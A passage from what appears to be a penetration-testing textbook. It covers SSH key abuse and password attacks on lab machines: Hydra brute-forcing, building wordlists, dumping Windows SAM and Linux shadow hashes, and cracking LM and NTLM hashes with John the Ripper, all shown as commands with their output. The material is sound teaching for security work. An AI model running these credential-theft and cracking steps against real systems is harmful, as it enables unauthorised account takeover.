~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# rm ~/.ssh/id_rsa\nNow, we copy georgia’s private key (id_rsa) and public key (id_rsa.pub) to\nroot’s .ssh directory on Kali, and use the ssh-add command to add the iden-\ntity to the authentication agent before we try to SSH into the Linux target. Exploitation 195\nroot@kali:/tmp/mount/.ssh# cp id_rsa.pub ~/.ssh/id_rsa.pub\nroot@kali:/tmp/mount/.ssh# cp id_rsa ~/.ssh/id_rsa\nroot@kali:/tmp/mount/.ssh# ssh-add\nIdentity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\nroot@kali:/tmp/mount/.ssh# ssh georgia@192.168.20.11\nLinux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686\ngeorgia@ubuntu:~$\nAgain, we are able to gain access to the target by manipulating the SSH\nkeys. We started with the ability to read and write files in georgia’s home\ndirectory. Now we have a shell on the Linux system as user georgia without\nneeding a password. summary\nIn this chapter we were able to combine the information we gathered in\nChapter 5 with the vulnerabilities discovered in Chapter 6 to exploit mul-\ntiple compromises on both the Windows XP and Linux targets. We used\nvarious techniques, including attacking misconfigured web servers, piggy-\nbacking on backdoored software, taking advantage of poor access control\nto sensitive files, exploiting vulnerabilities in the underlying system, and\nexploiting issues in third-party software. Now that we’ve managed to get a foothold in the systems, in the next\nchapter, let’s turn to cracking the passwords we found on the systems. 196 Chapter 8\n9\nPassworD at taCks\nPasswords are often the path of least resistance on\npentesting engagements. A client with a strong secu-\nrity program can fix missing Windows patches and\nout-of-date software, but the users themselves can’t be\npatched. We’ll look at attacking users when we discuss\nsocial engineering in Chapter 11, but if we can correctly guess or calculate\na user’s password, we may be able to avoid involving the user in the attack at\nall. In this chapter we’ll look at how to use tools to automate running services\non our targets and sending usernames and passwords. Additionally, we’ll\nstudy cracking the password hashes we gained access to in Chapter 8. Password management\nCompanies are waking up to the inherent risks of password-based authen-\ntication; brute-force attacks and educated guesses are both serious risks to\nweak passwords. Many organizations use biometric (fingerprint or retinal\nscan-based) or two-factor authentication to mitigate these risks. Even web\nservices such as Gmail and Dropbox offer two-factor authentication in\nwhich the user provides a password as well as a second value, such as the\ndigits on an electronic token. If two-factor authentication is not available,\nusing strong passwords is imperative for account security because all that\nstands between the attacker and sensitive data may come down to a simple\nstring. Strong passwords are long, use characters from multiple complexity\nclasses, and are not based on a dictionary word. The passwords we use in this book are deliberately terrible, but unfor-\ntunately, many users don’t behave much better when it comes to passwords. Organizations can force users to create strong passwords, but as passwords\nbecome more complex, they become harder to remember. Users are likely\nto leave a password that they can’t remember in a file on their computer, in\ntheir smartphone, or even on a Post-it note, because it’s just easier to keep\nof track them that way. Of course, passwords that can be discovered lying\naround in plaintext undermine the security of using a strong password. Another cardinal sin of good password management is using the same\npassword on many sites. In a worst-case scenario, the CEO’s weak password\nfor a compromised web forum might just be the very same one for his or\nher corporate access to financial documents. Password reuse is something\nto bear in mind while performing password attacks; you may find the same\npasswords work on multiple systems and sites. Password management presents a difficult problem for IT staff and will\nlikely continue to be a fruitful avenue for attackers unless or until password-\nbased authentication is phased out entirely in favor of another model. online Password attacks\nJust as we used automated scans to find vulnerabilities, we can use scripts to\nautomatically attempt to log in to services and find valid credentials. We’ll\nuse tools designed for automating online password attacks or guessing pass-\nwords until the server responds with a successful login. These tools use a\ntechnique called brute forcing. Tools that use brute forcing try every possible\nusername and password combination, and given enough time, they will find\nvalid credentials. The trouble with brute forcing is that as stronger passwords are used,\nthe time it takes to brute-force them moves from hours to years and even\nbeyond your natural lifetime. We can probably find working credentials\nmore easily by feeding educated guesses about the correct passwords into\nan automated login tool. Dictionary words are easy to remember, so despite\nthe security warnings, many users incorporate them into passwords. Slightly\nmore security-conscious users might put some numbers at the end of their\npassword or maybe even an exclamation point. 198 Chapter 9\nWordlists\nBefore you can use a tool to guess passwords, you need a list of credentials\nto try. If you don’t know the name of the user account you want to crack, or\nyou just want to crack as many accounts as possible, you can provide a user-\nname list for the password-guessing tool to iterate through. User Lists\nWhen creating a user list, first try to determine the client’s username scheme. For instance, if we’re trying to break into employee email accounts, figure\nout the pattern the email addresses follow. Are they firstname.lastname, just a\nfirst name, or something else? You can look for good username candidates on lists of common first or\nlast names. Of course, the guesses will be even more likely to succeed if you\ncan find the names of your target’s actual employees. If a company uses a\nfirst initial followed by a last name for the username scheme, and they have\nan employee named John Smith, jsmith is likely a valid username. Listing 9-1\nshows a very short sample user list. You’d probably want a larger list of users\nin an actual engagement. root@kali:~# cat userlist.txt\ngeorgia\njohn\nmom\njames\nListing 9-1: Sample user list\nOnce you’ve created your list, save the sample usernames in a text file\nin Kali Linux, as shown in Listing 9-1. You’ll use this list to perform online\npassword attacks in “Guessing Usernames and Passwords with Hydra” on\npage 202. Password Lists\nIn addition to a list of possible users, we’ll also need a password list, as\nshown in Listing 9-2. root@kali:~# cat passwordfile.txt\npassword\nPassword\npassword1\nPassword1\nPassword123\npassword123\nListing 9-2: Sample password list\nPassword Attacks 199\nLike our username list, this password list is just a very short example\n(and one that, hopefully, wouldn’t find the correct passwords for too many\naccounts in the real world). On a real engagement, you should use a much\nlonger wordlist. There are many good password lists available on the Internet. Good\nplaces to look for wordlists include http://packetstormsecurity.com/Crackers/\nwordlists/ and http://www.openwall.com/wordlists/. A few password lists are also\nbuilt into Kali Linux. For example, the /usr/share/wordlists directory con-\ntains a file called rockyou.txt.gz. This is a compressed wordlist. If you unzip\nthe file with the gunzip Linux utility, you’ll have about 140 MB of possible\npasswords, which should give you a pretty good start. Also, some of the\npassword-cracking tools in Kali come with sample wordlists. For example,\nthe John the Ripper tool (which we’ll use in “Offline Password Attacks” on\npage 203) includes a wordlist at /usr/share/john/password.lst. For better results, customize your wordlists for a particular target by\nincluding additional words. You can make educated guesses based on infor-\nmation you gather about employees online. Information about spouses,\nchildren, pets, and hobbies may put you on the right track. For example,\nif your target’s CEO is a huge Taylor Swift fan on social media, consider\nadding keywords related to her albums, her music, or her boyfriends. If\nyour target’s password is TaylorSwift13!, you should be able to confirm it\nusing password guessing long before you have to run a whole precompiled\nwordlist or a brute-force attempt. Another thing to keep in mind is the\nlanguage(s) used by your target. Many of your pentesting targets may be\nglobal. In addition to making educated guesses based on information you\ngather while performing reconnaissance, a tool like the ceWL custom\nwordlist generator will search a company website for words to add to\nyour wordlist. Listing 9-3 shows how you might use ceWL to create a\nwordlist based on the contents of www.bulbsecurity.com. root@kali:~# cewl --help\ncewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)\nUsage: cewl [OPTION] ... URL\n--snip--\n--depth x, -d x: depth to spider to, default 2 u\n--min_word_length, -m: minimum word length, default 3 v\n--offsite, -o: let the spider visit other sites\n--write, -w file: write the output to the file w\n--ua, -u user-agent: useragent to send\n--snip--\nURL: The site to spider. root@kali:~# cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com x\nListing 9-3: Using ceWL to build custom wordlists\n200 Chapter 9\nThe command ceWL --help lists ceWL’s usage instructions. Use the -d\n(depth) option u to specify how many links ceWL should follow on the\ntarget website. If you think that your target has a minimum password-size\nrequirement, you might specify a minimum word length to match with the\n-m option v. Once you’ve made your choices, output ceWL’s results to a file\nwith the -w option w. For example, to search www.bulbsecurity.com to depth\n1 with minimum word length of 5 characters and output the words found to\nthe file bulbwords.txt, you would use the command shown at x. The resulting\nfile would include all words found on the site that meet your specifications. Another method for creating wordlists is producing a list of every pos-\nsible combination of a given set of characters, or a list of every combination\nof characters for a specified number of characters. The tool Crunch in Kali\nwill generate these character sets for you. Of course, the more possibilities,\nthe more disk space is required for storage. A very simple example of using\nCrunch is shown in Listing 9-4. root@kali:~# crunch 7 7 AB\nCrunch will now generate the following amount of data: 1024 bytes\n0 MB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 128\n\nAAAAAAA\n\nAAAAAAB\n--snip--\nListing 9-4: Brute-forcing a keyspace with Crunch\nThis example generates a list of all the possible seven-character com-\nbinations of just the characters A and B. A more useful, but much, much\nlarger example would be entering crunch 7 8, which would generate a list\nof all the possible combinations of characters for a string between seven\nand eight characters in length, using the default Crunch character set of\nlowercase letters. This technique is known as keyspace brute-forcing. While\nit is not feasible to try every possible combination of characters for a pass-\nword in the span of your natural life, it is possible to try specific subsets; for\ninstance, if you knew the client’s password policy requires passwords to be at\nleast seven characters long, trying all seven- and eight-character passwords\nwould probably result in cracking success—even among the rare users who\ndid not base their passwords on a dictionary word. note Developing a solid wordlist or set of wordlists is a constantly evolving process. For the\nexercises in this chapter, you can use the short sample wordlist we created in Listing 9-2,\nbut as you gain experience in the field, you’ll develop more complex lists that work\nwell on client engagements. Now let’s see how to use our wordlist to guess passwords for services\nrunning on our targets. Password Attacks 201\nGuessing Usernames and Passwords with Hydra\nIf you have a set of credentials that you’d like to try against a running service\nthat requires a login, you can input them manually one by one or use a tool\nto automate the process. Hydra is an online password-guessing tool that can\nbe used to test usernames and passwords for running services. (Following\nthe tradition of naming security tools after the victims of Heracles’s labors,\nHydra is named for the mythical Greek serpent with many heads.) Listing 9-5\nshows an example of using Hydra for online password guessing. root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3\nHydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only\nHydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26\n[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task\n[DATA] attacking service pop3 on port 110\n[110][pop3] host: 192.168.20.10 login: georgia password: passwordu\n[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)\n1 of 1 target successfuly completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2015-01-12 15:29:48\nListing 9-5: Using Hydra to guess POP3 usernames and passwords\nListing 9-5 shows how to use Hydra to guess usernames and passwords\nby running through our username and password files to search for valid\nPOP3 credentials on our Windows XP target. This command uses the -L\nflag to specify the username file, the -P for the password list file, and spec-\nifies the protocol pop3. Hydra finds that user georgia’s password is password at\nu. (Shame on georgia for using such an insecure password!)\nSometimes you’ll know that a specific username exists on a server, and\nyou just need a valid password to go with it. For example, we used the SMTP\nVRFY verb to find valid usernames on the SLMail server on the Windows XP\ntarget in Chapter 6. As you can see in Listing 9-6, we can use the -l flag\ninstead of -L to specify one particular username. Knowing that, let’s look\nfor a valid password for user georgia on the pop3 server. root@kali:~# hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3\nHydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only\n[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task\n[DATA] attacking service pop3 on port 110\n[110][pop3] host: 192.168.20.10 login: georgia password: passwordu\n[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)\n1 of 1 target successfuly completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2015-01-07 20:22:23\nListing 9-6: Using a specific username with Hydra\nHydra found georgia’s password to be password u. Now, in Listing 9-7, we’ll use our credentials to read georgia’s email. root@kali:~# nc 192.168.20.10 pop3\n+OK POP3 server xpvictim.com ready <00037.23305859@xpvictim.com>\n202 Chapter 9\nUSER georgia\n+OK georgia welcome here\nPASS password\n+OK mailbox for georgia has 0 messages (0 octets)\nListing 9-7: Using Netcat to log in with guessed credentials\nSpecify the pop3 protocol, and provide the username and password\nwhen prompted. (Unfortunately, there are no love letters in this particular\ninbox.) Hydra can perform online password guessing against a range of ser-\nvices. (See its manual page for a complete list.) For example, here we use\nthe credentials we found with Hydra to log in with Netcat. Keep in mind that most services can be configured to lock out accounts\nafter a certain number of failed login attempts. There are few better ways\nto get noticed by a client’s IT staff than suddenly locking out several user\naccounts. Logins in rapid succession can also tip off firewalls and intrusion-\nprevention systems, which will get your IP address blocked at the perimeter. Slowing down and randomizing scans can help with this, but there is, of\ncourse, a tradeoff: Slower scans will take longer to produce results. One way to avoid having your login attempts noticed is to try to guess a\npassword before trying to log in, as you’ll learn in the next section. offline Password attacks\nAnother way to crack passwords (without being discovered) is to get a copy\nof the password hashes and attempt to reverse them back to plaintext pass-\nwords. This is easier said than done because hashes are designed to be the\nproduct of a one-way hash function: Given an input, you can calculate the\noutput using the hash function, but given the output, there is no way to\nreliably determine the input. Thus, if a hash is compromised, there should\nbe no way to calculate the plaintext password. We can, however, guess a\npassword, hash it with the one-way hash function, and compare the results\nto the known hash. If the two hashes are the same, we’ve found the correct\npassword. note As you’ll learn in “LM vs. NTLM Hashing Algorithms” on page 208, not all pass-\nword hashing systems have stood the test of time. Some have been cracked and are no\nlonger considered secure. In these cases, regardless of the strength of the password cho-\nsen, an attacker with access to the hashes will be able to recover the plaintext password\nin a reasonable amount of time. Of course, it’s even better if you can get access to passwords in plain-\ntext and save yourself the trouble of trying to reverse the cryptography, but\noften the passwords you encounter will be hashed in some way. In this section\nwe’ll focus on finding and reversing password hashes. If you stumble upon a\nprogram configuration file, database, or other file that stores passwords in\nplaintext, all the better. But before we can try to crack password hashes, we have to find them. We all hope that the services that store our passwords do a good job of\nPassword Attacks 203\nprotecting them, but that’s never a given. It only takes one exploitable flaw or\na user who falls victim to a social-engineering attack (discussed in Chapter 11)\nto bring down the whole house of cards. You’ll find plenty of password hashes\nlying around sites like Pastebin, remnants from past security breaches. In Chapter 8, we gained access to some password hashes on the Linux\nand Windows XP targets. Having gained a Meterpreter session with system\nprivileges on the Windows XP system via the windows/smb/ms08_067_netapi\nMetasploit module, we can use the hashdump Meterpreter command to print\nthe hashed Windows passwords, as shown in Listing 9-8. meterpreter > hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\ngeorgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::\nsecret:1004:e52cac67419a9a22664345140a852f61:58a478135a93ac3bf058a5ea0e8fdb71:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::\nListing 9-8: Dumping password hashes in Meterpreter\nSave the output of the hashdump to a file called xphashes.txt, which we\nwill use in “John the Ripper” on page 210. In Chapter 8 we also downloaded backups of the SAM and SYSTEM\nhives using the local file inclusion issue in Zervit 0.4 on the Windows XP\nsystem. We used this same issue to download the configuration file for\nthe FileZilla FTP server, which contained passwords hashed with the MD5\nalgorithm. On the Linux target, the Vsftpd smiley-face backdoor gave us\nroot privileges, and thus we can access to the file /etc/shadow, which stores\nLinux password hashes. We saved the password for user georgia to the file\nlinuxpasswords.txt. Recovering Password Hashes from a Windows SAM File\nThe SAM file stores hashed Windows passwords. Though we were able to use\nMeterpreter to dump the password hashes from the Windows XP system (as\nshown previously), sometimes you’ll be able to get only the SAM file. We weren’t able to get access to the primary SAM file through the\nZervit 0.4 vulnerability, but we were able to download a backup copy from\nthe C:\\Windows\\repair directory using a local file-inclusion vulnerability. But\nwhen we try to read the SAM file (as shown in Listing 9-9), we don’t see any\npassword hashes. root@bt:~# cat sam\nregf P P5gfhbin����nk,�u����� ���� ���������x����SAMX���skx x � �p�µ\\µ? ? µ µ\n����nk L���� �B���� �x �����SAM����skxx7d\n�HXµ4µ? ����vk � CP��� � µ�x�µD0�µ �µ�� 4µ1 ? �����\n����lf SAM����nk �u����� H#���� Px ����Domains����vk�����8lf �Doma����nk\n\\��J��� ������0x ����( Account����vk ��\n--snip--\nListing 9-9: Viewing the SAM file\n204 Chapter 9\nThe SAM file is obfuscated because the Windows Syskey utility encrypts\nthe password hashes inside the SAM file with 128-bit Rivest Cipher 4 (RC4)\nto provide additional security. Even if an attacker or pentester can gain\naccess to the SAM file, there’s a bit more work to do before we can recover the\npassword hashes. Specifically, we need a key to reverse the encrypted hashes.\n\nThe encryption key for the Syskey utility is called the bootkey, and it’s\nstored in the Windows SYSTEM file. You’ll find a copy of the SYSTEM file in\nthe C:\\Windows\\repair directory where we found the backup SAM file. We can\nuse a tool in Kali called Bkhive to extract the Syskey utility’s bootkey from the\nSYSTEM file so we can decrypt the hashes, as shown in Listing 9-10. root@kali:~# bkhive system xpkey.txt\nbkhive 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : $$$PROTO.HIV\nDefault ControlSet: 001\nBootkey: 015777ab072930b22020b999557f42d5\nListing 9-10: Using Bkhive to extract the bootkey\nHere we use Bkhive to extract the bootkey by passing in the SYSTEM\nfile system (the file we downloaded from the repair directory using the\nZervit 0.4 directory traversal) as the first argument and extracting the file\nto xpkey.txt. Once we have the bootkey, we can use Samdump2 to retrieve\nthe password hashes from the SAM file, as shown in Listing 9-11. Pass\nSamdump2 the location of the SAM file and the bootkey from Bkhive as\narguments, and it will use the bootkey to decrypt the hashes. root@kali:~# samdump2 sam xpkey.txt\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : SAM\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::\nListing 9-11: Using Samdump2 to recover Windows hashes\nNow compare these hashes to those found with the hashdump command\nin an active Meterpreter session from Listing 9-8. (A Meterpreter session\nwith sufficient privileges can dump password hashes on the fly without\nrequiring us to download the SAM and SYSTEM files.) Notice that our hash\nlist in Listing 9-11 lacks entries for the users georgia or secret. What happened? When using the Zervit directory traversal, we weren’t able to access\nthe main SAM file at C:\\Windows\\System32\\config and instead downloaded\na backup from C:\\Windows\\repair\\sam. These users must have been created\nPassword Attacks 205\nafter the SAM file backup was created. We do have a password hash for the\nAdministrator user, though. Though not complete or fully up-to-date, we may\nstill be able to use cracked hashes from this backup SAM to log in to the\nsystems. Now let’s look at another way to access password hashes. Dumping Password Hashes with Physical Access\nOn some engagements, you’ll actually have physical access to user machines,\nwith so-called physical attacks in scope. While having physical access may\nnot appear very useful at first, you may be able to access the password hashes\nby restarting a system using a Linux Live CD to bypass security controls. (We’ll use a Kali ISO image, though other Linux Live CDs such as Helix\nor Ubuntu will work. We used a prebuilt Kali virtual machine in Chapter 1. To get a standalone ISO of Kali, go to http://www.kali.org.) When you boot\na machine with a Live CD, you can mount the internal hard disk and gain\naccess to all files, including the SAM and SYSTEM files. (When Windows\nboots, there are certain security controls in place to stop users from access-\ning the SAM file and dumping password hashes, but these aren’t active when\nthe filesystem is loaded in Linux.)\nOur Windows 7 virtual machine, with its solid external security posture,\nhas been a bit neglected in these last few chapters. Let’s dump its hashes\nusing a physical attack. First, we’ll point our virtual machine’s optical drive\nto a Kali ISO file, as shown in Figure 9-1 (for VMware Fusion). In VMware\nPlayer, highlight your Windows 7 virtual machine, right-click it and choose\nSettings, then choose CD/DVD (SATA) and point to the ISO in the Use\nISO Image field on the right side of the page. Figure 9-1: Setting our Windows 7 virtual machine to boot from the Kali\nISO file\nBy default, VMware will boot up the virtual machine so quickly that\nit will be difficult to change the BIOS settings to boot from the CD/DVD\ndrive instead of the hard disk. To fix this, we’ll add a line to the VMware\nconfiguration file (.vmx) to delay the boot process at the BIOS screen for\na few seconds. 206 Chapter 9\n1. On your host machine, browse to where you saved your virtual machines. Then, in the folder for the Windows 7 target, find the .vmx configura-\ntion file, and open it in a text editor. The configuration file should look\nsimilar to Listing 9-12. .encoding = \"UTF-8\"\nconfig.version = \"8\"\nvirtualHW.version = \"9\"\nvcpu.hotadd = \"TRUE\"\nscsi0.present = \"TRUE\"\nscsi0.virtualDev = \"lsilogic\"\n--snip--\nListing 9-12: VMware configuration file ( .vmx)\n2. Add the line bios.bootdelay = 3000 anywhere in the file. This tells the\nvirtual machine to delay booting for 3000 ms, or three seconds, enough\ntime for us to change the boot options. 3. Save the .vmx file, and restart the Windows 7 target. Once you can access\nthe BIOS, choose to boot from the CD drive. The virtual machine should\nstart the Kali ISO. Even though we’re booted into Kali, we can mount the\nWindows hard disk and access files, bypassing the security features of\nthe Windows operating system. Listing 9-13 shows how to mount the file system and dump the password\nhashes. root@kali:# umkdir -p /mnt/sda1\nroot@kali:# vmount /dev/sda1 /mnt/sda1\nroot@kali:# wcd /mnt/sda1/Windows/System32/config/\nroot@kali:/mnt/sda1/Windows/System32/config bkhive SYSTEM out\nroot@kali:/mnt/sda1/Windows/System32/config samdump2 SAM out\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\nRoot Key : CMI-CreateHive{899121E8-11D8-41B6-ACEB-301713D5ED8C}\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGeorgia Weidman:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b75B6c:::\nListing 9-13: Dumping Windows hashes with a Linux Live CD\nWe create a directory where we can mount our Windows filesystem with\nthe mkdir command at u. Next, we use mount v to mount the Windows file-\nsystem (/dev/sda1) in the newly created directory (/mnt/sda1), which means\nthat the target’s C drive is effectively at /mnt/sda1. The SAM and SYSTEM\nfiles in Windows are in the C:\\Windows\\System32\\config directory, so we change\ndirectories to /mnt/sda1/Windows/System32/config to access these files using\nPassword Attacks 207\ncd w, at which point we can use Samdump2 and Bkhive against the SAM\nand SYSTEM files without first saving these files and moving them to our\nKali system. Once again we’ve managed to get access to password hashes. We now\nhave hashes for our Windows XP target, our Windows 7 target, our Linux\ntarget, and the FileZilla FTP server on the Windows XP target. note In Chapter 13, we’ll explore some tricks for using password hashes to authenticate\nwithout the need for access to the plaintext passwords, but usually, in order to use\nthese hashes, we’ll need to reverse the cryptographic hash algorithms and get the plain-\ntext passwords. The difficulty of this depends on the password-hashing algorithm used\nas well as the strength of the password used. LM vs. NTLM Hashing Algorithms\nListing 9-14 compares the two password hash entries. The first one belongs\nto the Administrator account on Windows XP, which we found with hashdump in\nMeterpreter, and the second is Georgia Weidman’s account from Windows 7,\nwhich we found with physical access in the previous section. Administratoru:500v:e52cac67419a9a224a3b108f3fa6cb6dw:8846f7eaee8fb117ad06bdd830b7586cx\nGeorgia Weidmanu:1000v:aad3b435b51404eeaad3b435b51404eew:8846f7eaee8fb117ad06bdd830b7586cx\nListing 9-14: Dumping Windows hashes with a Linux Live CD\nThe first field in the hashes is the username u; the second is the user\nID v; the third is the password hash in LAN Manager (LM) format w; and\nthe fourth is the NT LAN Manager (NTLM) hash x. LM Hash was the pri-\nmary way to hash passwords on Microsoft Windows up to Windows NT, but\nit’s a cryptographically unsound method that makes it possible to discover\nthe correct plaintext password for an LM hash, regardless of a password’s\nlength and complexity. Microsoft introduced NTLM hashing to replace LM\nhash, but on Windows XP, passwords are stored in both LM and NTLM for-\nmats by default. (Windows 7 opts exclusively for the more secure NTLM hash.)\nIn the hashes in Listing 9-14, because both passwords are the\nstring password, the NTLM hash entries for each account are identi-\ncal, but the LM hash fields are different. The first entry has the value\ne52cac67419a9a224a3b108f3fa6cb6d, whereas the Windows 7 entry has\naad3b435b51404eeaad3b435b51404ee, which is LM hash-speak for empty. The\ninclusion of the LM hash entry will make cracking the hashes much sim-\npler. In fact, any LM-hashed password can be brute-forced in minutes to\nhours. In contrast, our ability to crack the NTLM hashes will depend on\nboth our ability to guess and the length and complexity of the password. If the hashing function is cryptographically sound, it could take years,\ndecades, or more than your lifetime to try every possible password. 208 Chapter 9\nThe Trouble with LM Password Hashes\nWhen you see LM hashes on a pentest, you can be sure that the plaintext\npassword is recoverable from the password hash. However, one-way hash\nfunctions can’t be reversed. Complex math is used to develop algorithms that\nmake it impossible to discover the original plaintext password value that was\nhashed, given the password hash. But we can run a plaintext password guess\nthrough the cryptographic hashing function and compare the results to\nthe hash we’re trying to crack; if they’re the same, we’ve found the correct\npassword. The following issues contribute to the insecurity of LM hashes:\n• Passwords are truncated at 14 characters.\n\n• Passwords are converted to all uppercase. • Passwords of fewer than 14 characters are null-padded to 14 characters. • The 14-character password is broken into two seven-character passwords\nthat are hashed separately. Why are these characteristics so significant? Say we start with a com-\nplex, strong password like this:\nT3LF23!+?sRty$J\nThis password has 15 characters from four classes, including lowercase\nletters, uppercase letters, numbers, and symbols, and it’s not based on a\ndictionary word. However, in the LM hash algorithm, the password is trun-\ncated to 14 characters like this:\nT3LF23!+?sRty$\nThen the lowercase letters are changed to uppercase:\nT3LF23!+?SRTY$\nNext, the password is split into two seven-character parts. The two parts\nare then used as keys to encrypt the static string KGS!@#$% using the Data\nEncryption Standard (DES) encryption algorithm:\nT3LF23! +?SRTY$\nThe resulting eight-character ciphertexts from the encryption are then\nconcatenated to make the LM hash. To crack an LM hash, we just need to find seven characters, all upper-\ncase, with perhaps some numbers and symbols. Modern computing hardware\ncan try every possible one- to seven-character combination, encrypt the string\nKGS!@#$%, and compare the resulting hash to a given value in a matter of min-\nutes to hours. Password Attacks 209\nJohn the Ripper\nOne of the more popular tools for cracking passwords is John the Ripper. The default mode for John the Ripper is brute forcing. Because the set of pos-\nsible plaintext passwords in LM hash is so limited, brute forcing is a viable\nmethod for cracking any LM hash in a reasonable amount of time, even with\nour Kali virtual machine, which has limited CPU power and memory. For example, if we save the Windows XP hashes we gathered earlier\nin this chapter to a file called xphashes.txt, then feed them to John the\nRipper like this, we find that John the Ripper can run through the entire\nset of possible passwords and come up with the correct answer, as shown in\nListing 9-15. root@kali: john xphashes.txt\nWarning: detected hash type \"lm\", but the string is also recognized as \"nt\"\nUse the \"--format=nt\" option to force loading these as that type instead\nLoaded 10 password hashes with no different salts (LM DES [128/128 BS SSE2])\n(SUPPORT_388945a0)\nPASSWOR (secret:1)\n(Guest)\nPASSWOR (georgia:1)\nPASSWOR (Administrator:1)\nD (georgia:2)\nD (Administrator:2)\nD123 (secret:2)\nListing 9-15: Cracking LM hashes with John the Ripper\nJohn the Ripper cracks the seven-character password hashes. In\nListing 9-15, we see that PASSWOR is the first half of the user secret’s pass-\nword. Likewise, it’s the first half of the password for georgia and Administrator. The second half of secret’s password is D123, and georgia and Administrator’s\nare D. Thus, the complete plaintext of the LM-hashed passwords are\nPASSWORD for georgia and Administrator and PASSWORD123 for secret. The\nLM hash doesn’t tell us the correct case for a password, and if you try log-\nging in to the Windows XP machine as Administrator or georgia with the\npassword PASSWORD or the account secret with PASSWORD123, you will\nget a login error because LM hash does not take into account the correct\ncase of the letters in the password. To find out the correct case of the password, we need to look at the\nfourth field of the NTLM hash. John the Ripper noted in the example in\nListing 9-15 that NTLM hashes were also present, and you can use the flag\n--format=nt to force John the Ripper to use those hashes (we don’t have LM\nhashes for Windows 7, so we will have to crack Windows 7 passwords with a\nwordlist since brute forcing the NTLM hashes would likely take too long). Cracking Windows NTLM hashes is nowhere near as easy as cracking\nLM ones. Although a five-character NTLM password that uses only lower-\ncase letters and no other complexity could be brute-forced as quickly as\nan LM hash, a 30-character NTLM password with lots of complexity could\n210 Chapter 9\ntake many years to crack. Trying every possible character combination of\nany length, hashing it, and comparing it to a value could go on forever until\nwe happened to stumble upon the correct value (only to find out that the\nuser has since changed his or her password). Instead of attempting to brute-force passwords, we can use wordlists\ncontaining known passwords, common passwords, dictionary words, combi-\nnations of dictionary words padded with numbers and symbols at the end,\nand so on. (We’ll see an example of using a wordlist with John the Ripper\nin “Cracking Linux Passwords” on page 212). a real-worlD examPle\nLegacy password hashing once made all the difference on one of my pentests . The domain controller was Windows Server 2008, with a strong security pos-\nture . The workstations throughout the enterprise were reasonably secure, too,\nhaving recently been upgraded to fully patched Windows 7 systems . There\nwas, however, one promising light in the dark: a Windows 2000 box that was\nmissing several security patches . I was able to quickly gain system privileges on\nthe machine using Metasploit . The trouble was that, while on paper, the penetration test was now a suc-\ncess, compromising the machine had gained me next to nothing . The system\ncontained no sensitive files, and it was the only machine on this particular net-\nwork, isolated from the new, updated Windows domain . It had all the trappings\nof a domain controller, except it had no clients . All of the other machines in\nthe environment were members of the new Windows 2008 domain controller’s\ndomain . Though technically I was now a domain administrator, I was no further\nalong on the pentest than I was before I found the Windows 2000 machine . Since this was the domain controller, the domain user password hashes\nwere included locally . Windows 2000, like Windows XP, stored the LM hashes\nof passwords . The client’s old domain administrator password was strong; it\nhad about 14 characters; included uppercase letters, lowercase letters, numbers,\nand symbols; and was not based on a dictionary word . Fortunately, because it\nwas LM hashed, I was able to get the password back in a matter of minutes . What do you think the domain administrator’s password was on the\nnew domain? You guessed it . It was the same as the domain administrator’s\npassword on the old domain . The Windows 2000 box had not been used in\nover six months, but it was still running, and it used an insecure hashing algo-\nrithm . Also, the client wasn’t changing their passwords regularly . These two\nthings combined to bring down what was otherwise a strong security posture . I\nwas able to access every system in the environment just by logging in with the\ndomain administrator password I found on the compromised Windows 2000\nsystem . Password Attacks 211\nCracking Linux Passwords\nWe can also use John the Ripper against the Linux password hashes we\ndumped after exploiting the Vsftpd server backdoor in Chapter 8, as shown\nin Listing 9-16. root@kali# cat linuxpasswords.txt\ngeorgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::\nroot@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt\nLoaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 